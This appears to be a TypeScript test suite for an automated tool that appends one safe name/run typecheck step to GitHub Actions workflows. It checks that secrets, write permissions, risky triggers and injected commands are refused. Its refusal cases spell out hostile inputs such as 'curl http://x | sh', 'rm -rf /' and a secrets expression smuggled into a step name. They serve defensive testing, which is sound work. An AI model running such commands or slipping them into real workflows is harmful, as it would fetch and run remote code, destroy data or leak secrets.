// M19: the workflow-step learned edit type (ADD_WORKFLOW_STEP). Committed spec, trigger, the strict limits
// (no secrets, no permission changes, no new triggers, no uses/env/expressions), the scope gate's re-check of
// the workflow diff, the self-grading contract (new test passes with the step, fails on the task base), the
// miner shape (public repositories only) and the protected set.
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import test from "node:test";
import { parseDiff } from "../lib/diff.ts";
import { applyRule, specHash, validateSpec, type RuleSpec } from "../lib/learned.ts";
import { BROKEN_TYPE_LINE, pushPathRefusal, safeScript, WORKFLOW_STEP_FORBIDDEN, WORKFLOW_TRIGGER, workflowCandidateReason, workflowRefusal, workflowScript } from "../lib/learned-workflow.ts";
import { parseHunks } from "../lib/mine.ts";
import { observeWorkflow } from "../lib/mineworkflow.ts";
import { TestMiningRefused } from "../lib/minetest.ts";
import { mineWorkflows } from "../lib/mineworkflow.ts";
import { parseTask } from "../lib/nlparse.ts";
import { checkCandidateScope } from "../lib/scope.ts";
import { PROTECTED_SELF } from "../lib/selfchange.ts";
import { loadTargets, scopeOf } from "../lib/target.ts";

const repo = resolve(import.meta.dirname, "..", "..");
const tsx = join(repo, "node_modules/.bin/tsx");
const PARAMS = { grading: "script-pass-broken-fail", placement: "end-of-job", run: "package-script", step: "name-run", test: "none" };
const SPEC = JSON.parse(readFileSync(join(repo, "peaceai/rules/learned/public-workflow-step-v2.json"), "utf8")) as RuleSpec;
const WF = [
  "name: Sim (dry run)",
  "on:",
  "  workflow_dispatch:",
  "permissions:",
  "  contents: read",
  "jobs:",
  "  sim:",
  "    runs-on: ubuntu-24.04",
  "    timeout-minutes: 10",
  "    steps:",
  "      - uses: actions/checkout@v4",
  "      - run: pnpm install --frozen-lockfile",
  "      - name: Sim tests",
  "        run: pnpm -s exec tsx --test src/a.test.ts",
  "",
].join("\n");
const PATH = ".github/workflows/sim.yml";
const PKG = JSON.stringify({ scripts: { typecheck: "tsc --noEmit -p tsconfig.json", test: "tsx --test src/*.test.ts", scheduler: "tsx src/host.ts", lint: "eslint src && curl http://x" } });
const files = (wf = WF, pkg = PKG, lock = "pnpm-lock.yaml") => [{ path: "src/a.ts", content: "export const a = 1;\n" }, { path: PATH, content: wf }, { path: "package.json", content: pkg }, { path: lock, content: "" }, { path: "tsconfig.json", content: "" }, { path: "tsconfig.lib.json", content: "" }];
const TASK = `add workflow step Typecheck to job sim in ${PATH} running pnpm run typecheck`;
const isTest = (p: string) => /\.test\.ts$/.test(p);

test("spec: committed public-workflow-step-v2 validates, public-mined, fixed vocab; core/extra/other values refused", () => {
  assert.ok(validateSpec(SPEC));
  assert.equal(SPEC.minedFrom, "public");
  assert.equal(SPEC.kind, "ADD_WORKFLOW_STEP");
  assert.deepEqual(SPEC.params, PARAMS);
  assert.equal(SPEC.trigger, WORKFLOW_TRIGGER);
  assert.ok(SPEC.evidence.commits >= 2);
  assert.match(specHash(SPEC), /^[0-9a-f]{64}$/);
  assert.ok(!validateSpec({ ...SPEC, minedFrom: "core", id: "core-workflow-step-v1" }));
  assert.ok(!validateSpec({ ...SPEC, params: { ...PARAMS, step: "uses" } }), "uses: steps are not in the vocabulary");
  assert.ok(!validateSpec({ ...SPEC, params: { ...PARAMS, run: "any" } }));
  assert.ok(!validateSpec({ ...SPEC, params: { ...PARAMS, env: "x" } }));
});

test("trigger: canonical only, needs approval", () => {
  const on = parseTask({ title: "[test] w", body: TASK }, { model: null, approvedKinds: new Set(["ADD_WORKFLOW_STEP"]) });
  const off = parseTask({ title: "[test] w", body: TASK }, { model: null, approvedKinds: new Set() });
  assert.equal(on.status, "canonical");
  assert.equal(off.status === "unsure" ? off.reason : off.status, "RULE_NOT_APPROVED");
});

test("engine: appends exactly the two-line step at the end of the job, existing lines byte-identical, nothing else (Auditor 3)", () => {
  const e = applyRule(SPEC, TASK, files(), isTest)!;
  assert.ok(e);
  assert.equal(e.path, PATH);
  assert.equal(e.content, WF.replace("src/a.test.ts\n", "src/a.test.ts\n      - name: Typecheck\n        run: pnpm run typecheck\n"));
  assert.equal(e.selfGrade, true);
  assert.deepEqual(e.extra, [], "no test file: the proof is a real run (Auditor 4)");
  const scope = { isSource: (p: string) => /^src\//.test(p), isTest, isDenied: (p: string) => /(^|\/)\./.test(p), isWorkflow: (p: string) => p === PATH };
  const diff = gitDiff(WF, e.content);
  assert.equal(diff.split("\n").filter((l) => /^[+-](?![+-])/.test(l)).length, 2, "diff is the 2 added lines");
  assert.deepEqual(checkCandidateScope(parseDiff(diff), new Set([PATH]), scope), []);
  assert.ok(checkCandidateScope(parseDiff(diff), new Set([PATH]), { ...scope, isWorkflow: () => false }).length > 0, "not opted in -> outside allowed paths");
});

test("Auditor 2: script text is exactly `tsc --noEmit` + plain flags; pre/post hooks refuse the step", () => {
  assert.deepEqual(safeScript("tsc --noEmit -p tsconfig.lib.json"), ["tsc", "--noEmit", "-p", "tsconfig.lib.json"]);
  assert.deepEqual(safeScript("tsc -p tsconfig.lib.json --noEmit"), ["tsc", "-p", "tsconfig.lib.json", "--noEmit"], "either order");
  assert.deepEqual(safeScript("tsc --project tsconfig.json --noEmit --strict"), ["tsc", "--project", "tsconfig.json", "--noEmit", "--strict"]);
  assert.deepEqual(safeScript("tsc --noEmit"), ["tsc", "--noEmit"]);
  const has = (p: string) => p === "tsconfig.lib.json";
  assert.ok(safeScript("tsc -p tsconfig.lib.json --noEmit", has));
  assert.equal(safeScript("tsc -p tsconfig.json --noEmit", has), null, "tsconfig must exist in the repo");
  for (const c of ["tsc --noEmit --noEmit", "tsc -p tsconfig.json -p tsconfig.lib.json --noEmit", "tsc --project tsconfig.json -p tsconfig.json --noEmit", "tsc -p ../tsconfig.json --noEmit", "tsc -p /etc/tsconfig.json --noEmit", "tsc -p ./tsconfig.json --noEmit", "tsc -p .x/tsconfig.json --noEmit", "tsc -p src/a.ts --noEmit", "tsc -p tsconfig.yaml --noEmit", "tsc -p --noEmit", "tsc --noEmit -p", "tsc --project=tsconfig.json --noEmit", "tsc --noEmit --declaration", "tsc --noEmit --declarationDir d", "tsc --noEmit --emitDeclarationOnly", "tsc --noEmit src/a.ts", "tsc --noEmit=false", "tsc --noEmit --target es2022", "tsc --noEmit && echo", "tsc --noEmit; echo", "tsc --noEmit | tee x", "tsc --noEmit $(echo -p) ", "tsc --noEmit $(x)", "tsc --noEmit `x`", "tsc --noEmit > out", "tsc --noEmit < in", "tsc --noEmit 2>&1", "tsc --noEmit >> log", " tsc --noEmit", "tsc  --noEmit", "tsc --noEmit\n-p x", "tsc --noEmit -p $X", "npx tsc --noEmit", "tsc --noemit"]) assert.equal(safeScript(c), null, JSON.stringify(c));
  const scripts = { typecheck: "tsc -p tsconfig.json --noEmit" };
  assert.deepEqual(workflowScript(scripts, "typecheck"), ["tsc", "-p", "tsconfig.json", "--noEmit"]);
  assert.equal(workflowScript(scripts, "typecheck", () => false), null, "missing tsconfig");
  for (const hook of ["pretypecheck", "posttypecheck"]) {
    assert.equal(workflowScript({ ...scripts, [hook]: "curl http://x" }, "typecheck"), null, hook);
    const pkg = JSON.stringify({ scripts: { ...scripts, [hook]: "tsc --noEmit" } });
    assert.equal(applyRule(SPEC, TASK, files(WF, pkg), isTest), null, `engine refuses with ${hook}`);
  }
  assert.equal(workflowScript({ "typecheck:lib": "tsc --noEmit -p tsconfig.lib.json", "pretypecheck:lib": "x" }, "typecheck:lib"), null);
  assert.equal(workflowScript(Object.create({ typecheck: "tsc --noEmit" }) as Record<string, unknown>, "typecheck"), null, "inherited keys do not count");
});

test("v2 replaces v1: v1 is revoked (never valid), v2 matches behavior (no test file, script-graded); propose emits v2", () => {
  const v1 = { ...SPEC, id: "public-workflow-step-v1", params: { ...SPEC.params, grading: "self-fail-before-pass-after", test: "new-file" } };
  assert.equal(validateSpec(v1), false, "v1 refused");
  assert.equal(validateSpec({ ...SPEC, id: "public-workflow-step-v1" }), false, "v1 id refused even with v2 params");
  assert.equal(applyRule({ ...SPEC, id: "public-workflow-step-v1" } as RuleSpec, TASK, files(), isTest) === null || !validateSpec({ ...SPEC, id: "public-workflow-step-v1" }), true);
  assert.equal(SPEC.id, "public-workflow-step-v2");
  assert.deepEqual(SPEC.params, PARAMS);
  assert.ok(validateSpec(SPEC));
  assert.ok(!existsSync(join(repo, "peaceai/rules/learned/public-workflow-step-v1.json")), "v1 file removed");
  // v1 is never approved; v2 may be approved (by Architect, via the normal landing PR) only with exactly its hash.
  const list = JSON.parse(readFileSync(join(repo, "peaceai/rules/approved.json"), "utf8")) as { rules?: { id: string; sha256: string }[] } | { id: string; sha256: string }[];
  const entries = (Array.isArray(list) ? list : list.rules ?? []).filter((r) => /workflow-step/.test(r.id));
  assert.ok(entries.every((r) => r.id === "public-workflow-step-v2"), "no workflow-step version but v2 is ever approved");
  for (const r of entries) assert.equal(r.sha256, "7c09a06ded2b478ff7af407682aae3d4d5eb19a25d07e1235ee00a86ff87d48b", "v2 approved only with its exact hash");
  assert.equal(specHash(SPEC), "7c09a06ded2b478ff7af407682aae3d4d5eb19a25d07e1235ee00a86ff87d48b", "committed v2 spec is the proposed one");
  assert.match(readFileSync(join(repo, "peaceai/lib/propose.ts"), "utf8"), /ADD_WORKFLOW_STEP: 2 \}/);
});

test("Auditor 3: a workflow-step candidate is only the workflow lines; package.json, lockfiles, tsconfig*, lint/prettier configs refused", () => {
  const scope = { isSource: (p: string) => /^src\//.test(p) || /(^|\/)(package\.json|tsconfig[^/]*|\.prettierrc|eslint\.config\.js)$/.test(p), isTest, isDenied: () => false, isWorkflow: (p: string) => p === PATH };
  const step = gitDiff(WF, WF.replace("src/a.test.ts\n", "src/a.test.ts\n      - name: T\n        run: pnpm run typecheck\n"));
  const isWf = (p: string) => p === PATH;
  assert.equal(workflowCandidateReason([PATH], isWf), null);
  assert.equal(workflowCandidateReason(["src/a.ts"], isWf), null, "not a workflow candidate");
  for (const p of ["package.json", "pnpm-lock.yaml", "package-lock.json", "yarn.lock", "npm-shrinkwrap.json", "tsconfig.json", "tsconfig.lib.json", "sub/tsconfig.base.json", ".eslintrc.json", "eslint.config.js", ".prettierrc", "prettier.config.mjs", ".prettierignore", ".npmrc", "biome.json"]) {
    assert.ok(WORKFLOW_STEP_FORBIDDEN.test(p), p);
    assert.match(workflowCandidateReason([PATH, p], isWf) ?? "", /may not change/, p);
  }
  assert.match(workflowCandidateReason([PATH, "src/new.test.ts"], isWf) ?? "", /only the two added workflow lines/);
  for (const [p, before] of [["package.json", "{}\n"], ["tsconfig.json", "{}\n"], ["src/a.ts", "export const a = 1;\n"]] as const) {
    const extra = `diff --git a/${p} b/${p}\n--- a/${p}\n+++ b/${p}\n@@ -1 +1,2 @@\n ${before.trimEnd()}\n+// x\n`;
    const v = checkCandidateScope(parseDiff(step + extra), new Set([PATH, p]), scope).map((x) => x.reason);
    assert.ok(v.some((r) => /workflow-step candidate/.test(r)), `${p}: ${v.join(";")}`);
  }
});

test("Auditor 4: grading runs the step's script: pass on the candidate, FAIL on the broken type input; proof needs 2 run ids", () => {
  const dir = mkdtempSync(join(tmpdir(), "m19b-"));
  try {
    writeFileSync(join(dir, "a.ts"), "export const a: number = 1;\n");
    writeFileSync(join(dir, "tsconfig.json"), JSON.stringify({ compilerOptions: { strict: true, module: "nodenext", target: "es2022", types: [] }, include: ["a.ts"] }));
    const words = safeScript("tsc --noEmit -p tsconfig.json")!;
    const tsc = join(repo, "node_modules/.bin/tsc");
    const run = () => spawnSync(tsc, words.slice(1), { cwd: dir, encoding: "utf8" }).status;
    assert.equal(run(), 0, "step passes");
    writeFileSync(join(dir, "a.ts"), "export const a: number = 1;\n" + BROKEN_TYPE_LINE);
    assert.notEqual(run(), 0, "same step fails on the broken type input");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
  const tc = readFileSync(join(repo, "peaceai/bin/test-candidates.ts"), "utf8");
  assert.match(tc, /if \(workflowStep\) return gradeWorkflowStep\(/, "workflow steps never graded by a YAML-finding test");
  assert.match(tc, /BROKEN_TYPE_LINE/);
  const doc = readFileSync(join(repo, "peaceai/proof/workflow-step-proof.md"), "utf8");
  assert.match(doc, /workflow-step-proof: pass-run=<id> broken-run=<id>/, "both run ids recorded");
  assert.match(doc, /real need, not one shaped to match the rule/, "Auditor 6 on the proof-issue template");
  assert.match(doc, /typecheck:lib is an acceptable target/);
});

test("Auditor 5: PeaceAI's push path refuses .github/workflows/**; no auto-merge, no workflow-write token", () => {
  for (const p of [".github/workflows/ci.yml", "./.github/workflows/x.yaml", ".github/workflows"]) assert.match(pushPathRefusal([p]) ?? "", /normal PR that Architect merges/, p);
  assert.equal(pushPathRefusal(["src/a.ts", ".github/CODEOWNERS"]), null);
  const verdict = readFileSync(join(repo, ".github/workflows/peace-verdict.yml"), "utf8");
  const applies = [...verdict.matchAll(/git apply --whitespace=nowarn "\$RUNNER_TEMP\/chosen\/chosen\.diff"/g)].map((m) => m.index!);
  assert.equal(applies.length, 3, "three push routes");
  for (const at of applies) assert.match(verdict.slice(Math.max(0, at - 400), at), /\\\.github\/workflows\/' "\$RUNNER_TEMP\/chosen\/chosen\.diff"; then\s+echo "refused: [^"]+"; exit 1/, "guard before each apply");
  // The guard's pattern really matches workflow diffs (and not src diffs).
  const re = /^(diff --git a\/.* b\/|\+\+\+ b\/|--- a\/|rename (from|to) |copy (from|to) )\.github\/workflows\//m;
  assert.ok(re.test(gitDiff(WF, WF + "# x\n")));
  assert.ok(!re.test("diff --git a/src/a.ts b/src/a.ts\n--- a/src/a.ts\n+++ b/src/a.ts\n"));
  const wfDir = join(repo, ".github/workflows");
  for (const f of readdirSync(wfDir)) {
    const t = readFileSync(join(wfDir, f), "utf8");
    assert.doesNotMatch(t, /^\s*workflows:\s*write/m, `${f}: no workflow-write permission`);
    assert.doesNotMatch(t, /--auto\b|auto-merge|enablePullRequestAutoMerge/i, `${f}: no auto-merge`);
  }
  for (const f of readdirSync(join(repo, "peaceai/bin"))) assert.doesNotMatch(readFileSync(join(repo, "peaceai/bin", f), "utf8"), /--auto\b|enablePullRequestAutoMerge/, f);
});

test("refusals: secrets, write/id-token permission, missing top permissions, privileged triggers, anchors, job-level env/permissions/uses", () => {
  const bad: [string, string][] = [
    ["secrets", WF.replace("      - run: pnpm install", "      - env:\n          K: ${{ secrets.K }}\n        run: pnpm install")],
    ["write", WF.replace("contents: read", "contents: write")],
    ["id-token", WF.replace("contents: read", "contents: read\n  id-token: write")],
    ["no top permissions", WF.replace("permissions:\n  contents: read\n", "")],
    ["read-all ok but write-all not", WF.replace("permissions:\n  contents: read", "permissions: write-all")],
    ["pull_request_target", WF.replace("  workflow_dispatch:", "  pull_request_target:")],
    ["workflow_run", WF.replace("  workflow_dispatch:", "  workflow_run:\n    workflows: [x]")],
    ["anchor", WF.replace("timeout-minutes: 10", "timeout-minutes: &t 10")],
  ];
  for (const [why, wf] of bad) assert.equal(applyRule(SPEC, TASK, files(wf), isTest), null, why);
  for (const k of ["permissions:\n      contents: read", "env:\n      A: b", "container: node:20", "services:\n      db:\n        image: x"]) assert.equal(applyRule(SPEC, TASK, files(WF.replace("    timeout-minutes: 10", `    timeout-minutes: 10\n    ${k}`)), isTest), null, k);
  assert.equal(workflowRefusal(WF.replace("permissions:\n  contents: read", "permissions: read-all")), null);
});

test("refusals: script must exist, be one safe tool with plain args, not test/scheduler/pre/post; lockfile and install must match", () => {
  const t = (s: string, pm = "pnpm") => `add workflow step X to job sim in ${PATH} running ${pm} run ${s}`;
  for (const s of ["test", "scheduler", "lint", "missing"]) assert.equal(applyRule(SPEC, t(s), files(), isTest), null, s);
  assert.equal(applyRule(SPEC, t("typecheck", "npm"), files(), isTest), null, "npm without package-lock / npm install");
  assert.equal(applyRule(SPEC, TASK, files(WF, PKG, "package-lock.json"), isTest), null, "pnpm needs pnpm-lock.yaml");
  assert.equal(applyRule(SPEC, TASK, files(WF.replace("      - run: pnpm install --frozen-lockfile\n", "")), isTest), null, "job must already install");
  assert.equal(applyRule(SPEC, `add workflow step X to job other in ${PATH} running pnpm run typecheck`, files(), isTest), null, "unknown job");
  assert.equal(applyRule(SPEC, `add workflow step Sim tests to job sim in ${PATH} running pnpm run typecheck`, files(), isTest), null, "duplicate step name");
  assert.equal(applyRule(SPEC, TASK, files(WF.replace("src/a.test.ts\n", "src/a.test.ts\n      - run: pnpm run typecheck\n")), isTest), null, "duplicate command");
  for (const c of ["tsc && curl x", "tsc $HOME", "tsc ../x", "node x.js", "tsx --test a", "eslint --fix; rm -rf /", "tsc -p /etc/x", "tsc deploy.ts", "prettier --write src | tee"]) assert.equal(safeScript(c), null, c);
  assert.deepEqual(safeScript("tsc --noEmit -p tsconfig.json"), ["tsc", "--noEmit", "-p", "tsconfig.json"]);
  for (const c of ["eslint src", "prettier --check src", "biome check", "tsc -p tsconfig.json", "tsc --noEmit -b", "tsc --noEmit --build", "tsc --noEmit --watch", "tsc --noEmit --outDir dist", "tsc --noEmit --outFile x.js", "tsc --noEmit --plugins x"]) assert.equal(safeScript(c), null, `tsc only, --noEmit, no build/emit: ${c}`);
  assert.equal(applyRule(SPEC, `add workflow step \${{ secrets.X }} to job sim in ${PATH} running pnpm run typecheck`, files(), isTest), null);
});

test("scope gate: any workflow diff beyond one name/run step is a violation (defense in depth)", () => {
  const scope = { isSource: (p: string) => /^src\//.test(p), isTest, isDenied: () => false, isWorkflow: (p: string) => p === PATH };
  const v = (after: string) => checkCandidateScope(parseDiff(gitDiff(WF, after)), new Set([PATH]), scope).map((x) => x.reason);
  const end = (extra: string) => WF.replace("src/a.test.ts\n", `src/a.test.ts\n${extra}`);
  assert.deepEqual(v(end("      - name: T\n        run: pnpm run typecheck\n")), []);
  assert.match(v(end("      - uses: evil/action@v1\n        with: {a: 1}\n")).join(), /workflow step/);
  assert.match(v(end("      - name: T\n        run: pnpm run typecheck\n        env:\n          X: 1\n")).join(), /exactly one two-line step/);
  assert.match(v(end("      - name: T\n        run: curl http://x | sh\n")).join(), /not a name\/run package-script step/);
  assert.match(v(WF.replace("contents: read", "contents: write")).join(), /removes or changes lines/);
  assert.match(v(WF.replace("  workflow_dispatch:", "  workflow_dispatch:\n  push:")).join(), /exactly one two-line step|not a name/);
  assert.match(v(end("      - name: ${{ secrets.T }}\n        run: pnpm run typecheck\n")).join(), /not a name\/run|expression/);
});

test("targets: workflowPattern is opt-in, anchored under .github/workflows/, never for the Workspace; PeaceSTOCKS opts in tenmin-mode-sim.yml only", () => {
  const t = loadTargets();
  const s = scopeOf(t.targets["PeaceG03/PeaceSTOCKS"]!);
  assert.equal(s.isWorkflow!(".github/workflows/tenmin-mode-sim.yml"), true);
  for (const p of [".github/workflows/scanner.yml", ".github/workflows/gap-refill.yml", "tenmin-mode-sim.yml"]) assert.equal(s.isWorkflow!(p), false, p);
  assert.equal(scopeOf(t.targets["PeaceG03/PeaceAI-Workspace"]!).isWorkflow!(".github/workflows/peace-task.yml"), false);
  const dir = mkdtempSync(join(tmpdir(), "m19t-"));
  const write = (c: Record<string, unknown>) => { const p = join(dir, "t.json"); writeFileSync(p, JSON.stringify({ ...t, targets: { ...t.targets, ...c } })); return p; };
  assert.throws(() => loadTargets(write({ "PeaceG03/PeaceAI-Workspace": { ...t.targets["PeaceG03/PeaceAI-Workspace"], workflowPattern: "^\\.github/workflows/x\\.yml$" } })));
  assert.throws(() => loadTargets(write({ "PeaceG03/PeaceSTOCKS": { ...t.targets["PeaceG03/PeaceSTOCKS"], workflowPattern: "scanner" } })));
  rmSync(dir, { recursive: true, force: true });
  // The real PeaceSTOCKS scanner workflow (secrets, write permissions) is refused by the rule itself too.
  const scanner = join(repo, "..", "PeaceSTOCKS", ".github/workflows/scanner.yml");
  try { assert.notEqual(workflowRefusal(readFileSync(scanner, "utf8")), null); } catch (e) { if ((e as NodeJS.ErrnoException).code !== "ENOENT") throw e; }
});

test("miner: one appended name/run step at a job's end is observed with its style; public repositories only", () => {
  const post = WF.replace("src/a.test.ts\n", "src/a.test.ts\n      # comment\n      - name: Typecheck\n        run: pnpm run typecheck\n");
  const obs = observeWorkflow("x@1", PATH, post, parseHunks(gitDiff(WF, post, 0)));
  assert.equal(obs.length, 1);
  assert.deepEqual(obs[0]!.style, { step: "name-run", extraKeys: "none", run: "package-script", expressions: "none", secrets: "none", placement: "end-of-job" });
  assert.deepEqual(observeWorkflow("x@1", "src/a.ts", post, parseHunks(gitDiff(WF, post, 0))), []);
  const dir = mkdtempSync(join(tmpdir(), "m19m-"));
  spawnSync("git", ["init", "-q", dir]);
  assert.throws(() => mineWorkflows(dir, "HEAD", "PeaceSTOCKS-Net"), TestMiningRefused);
  assert.throws(() => mineWorkflows(dir, "HEAD", "PeaceSTOCKS"), TestMiningRefused, "origin must be the public repo");
  rmSync(dir, { recursive: true, force: true });
});

test("protected (M19): learned-workflow and mineworkflow are protected", () => {
  for (const p of ["peaceai/lib/learned-workflow.ts", "peaceai/lib/mineworkflow.ts", "peaceai/lib/scope.ts", "peaceai/lib/target.ts", "peaceai/targets.json", "peaceai/proof/workflow-step-proof.md"]) assert.ok(PROTECTED_SELF.some((x) => x.pattern.test(p)), p);
});

function gitDiff(before: string, after: string, ctx = 3): string {
  const d = mkdtempSync(join(tmpdir(), "m19d-"));
  mkdirSync(join(d, ".github/workflows"), { recursive: true });
  spawnSync("git", ["init", "-q", d]);
  writeFileSync(join(d, PATH), before);
  spawnSync("git", ["-C", d, "add", "-A"]);
  spawnSync("git", ["-C", d, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "b"]);
  writeFileSync(join(d, PATH), after);
  const out = spawnSync("git", ["-C", d, "diff", `-U${ctx}`, "--no-color"], { encoding: "utf8" }).stdout;
  rmSync(d, { recursive: true, force: true });
  return out;
}
